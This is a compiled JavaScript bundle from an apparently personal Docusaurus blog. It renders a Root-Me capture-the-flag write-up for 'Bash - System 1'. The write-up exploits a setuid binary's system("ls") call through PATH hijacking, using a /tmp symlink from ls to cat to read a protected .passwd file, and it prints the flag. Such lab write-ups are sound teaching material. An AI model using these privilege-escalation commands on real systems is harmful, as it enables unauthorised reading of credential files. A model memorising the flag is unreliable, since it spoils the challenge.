"use strict";(self.webpackChunkmy_own_blog=self.webpackChunkmy_own_blog||[]).push([[3742],{7896:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>d,frontMatter:()=>i,metadata:()=>r,toc:()=>a});const r=JSON.parse('{"id":"root-me/app-script/bash-system-1","title":"Bash - System 1","description":"- Description: Find your path, padawan!","source":"@site/docs/root-me/app-script/bash-system-1.mdx","sourceDirName":"root-me/app-script","slug":"/root-me/app-script/bash-system-1","permalink":"/my-small-blog/docs/root-me/app-script/bash-system-1","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"tags":[]},"sidebar":"tutorialSidebar","previous":{"title":"App - Script","permalink":"/my-small-blog/docs/category/app---script"},"next":{"title":"Bash - System 2","permalink":"/my-small-blog/docs/root-me/app-script/bash-system-2"}}');var t=s(4848),c=s(8453);const i={tags:[]},l="Bash - System 1",o={},a=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function h(e){const n={blockquote:"blockquote",code:"code",em:"em",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"bash---system-1",children:"Bash - System 1"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Description:"})," Find your path, padawan!"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Difficulty:"})," Very easy"]}),"\n"]}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,t.jsx)(n.p,{children:"Upon connecting to the target machine, we are presented with a list of files in the current directory:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-js",children:"app-script-ch11@challenge02:~$ ls -la\r\ntotal 36\r\ndr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 .\r\ndrwxr-xr-x 25 root                    root            4096 Sep  5  2023 ..\r\n//highlight-start\r\n-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11\r\n-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c\r\n//highlight-end\r\n-rw-r-----  1 root                    root              43 Dec 10  2021 .git\r\n-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile\r\n//highlight-next-line\r\n-r--------  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd\r\n-r--------  1 root                    root             775 Dec 10  2021 ._perms\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Our goal is to read the contents of the ",(0,t.jsx)(n.code,{children:".passwd"})," file in order to retrieve the flag.\r\nHowever, direct access is restricted:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"app-script-ch11@challenge02:~$ cat .passwd \r\ncat: .passwd: Permission denied\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Looking into the source code, we observe that when the binary ",(0,t.jsx)(n.code,{children:"ch11"})," is executed, it internally runs the command ",(0,t.jsx)(n.code,{children:"ls /challenge/app-script/ch11/.passwd"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'int main(void)\r\n{\r\n    setreuid(geteuid(), geteuid());\r\n    system("ls /challenge/app-script/ch11/.passwd");\r\n    return 0;\r\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:"Since we have execute permission on ch11, we can use this behavior to our advantage:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"app-script-ch11@challenge02:~$ ./ch11 \r\n/challenge/app-script/ch11/.passwd\n"})}),"\n",(0,t.jsxs)(n.p,{children:["There are multiple possible approaches from here, but we'll go with ",(0,t.jsx)(n.strong,{children:"a symbolic link"}),' (symlink) attack by exploiting how the system("',(0,t.jsx)(n.code,{children:"ls ..."}),'") call works.']}),"\n",(0,t.jsx)(n.p,{children:"Key observations:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["The ",(0,t.jsx)(n.code,{children:"system()"})," function does not invoke ",(0,t.jsx)(n.code,{children:"/bin/ls"})," directly."]}),"\n",(0,t.jsxs)(n.li,{children:["Instead, it spawns a shell (",(0,t.jsx)(n.code,{children:"/bin/sh"}),") which resolves ls using the ",(0,t.jsx)(n.strong,{children:"PATH"})," environment variable."]}),"\n",(0,t.jsxs)(n.li,{children:["If we override the ",(0,t.jsx)(n.strong,{children:"PATH"})," variable to point to ",(0,t.jsx)(n.em,{children:"a fake ls"})," (which is actually a symlink to ",(0,t.jsx)(n.em,{children:"cat"}),"), we can trick the program into executing ",(0,t.jsx)(n.em,{children:"cat"})," instead of ",(0,t.jsx)(n.em,{children:"ls"}),"."]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Here's how to do it:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Create a fake directory:"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"mkdir /tmp/fake\n"})}),"\n",(0,t.jsxs)(n.ol,{start:"2",children:["\n",(0,t.jsxs)(n.li,{children:["Create a symbolic link from ",(0,t.jsx)(n.code,{children:"ls"})," to ",(0,t.jsx)(n.code,{children:"cat"}),":"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"ln -s /bin/cat /tmp/fake/ls\n"})}),"\n",(0,t.jsxs)(n.ol,{start:"3",children:["\n",(0,t.jsx)(n.li,{children:"Run the vulnerable binary with the modified PATH:"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"app-script-ch11@challenge02:~$ PATH=/tmp/fake:$PATH ./ch11\r\n!oPe96a/.s8d5\n"})}),"\n",(0,t.jsxs)(n.p,{children:["And just like that, the contents of ",(0,t.jsx)(n.code,{children:".passwd"})," are revealed, giving us the flag."]}),"\n",(0,t.jsx)(n.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"!oPe96a/.s8d5"})}),"\n"]})]})}function d(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(h,{...e})}):h(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>l});var r=s(6540);const t={},c=r.createContext(t);function i(e){const n=r.useContext(c);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),r.createElement(c.Provider,{value:n},e.children)}}}]);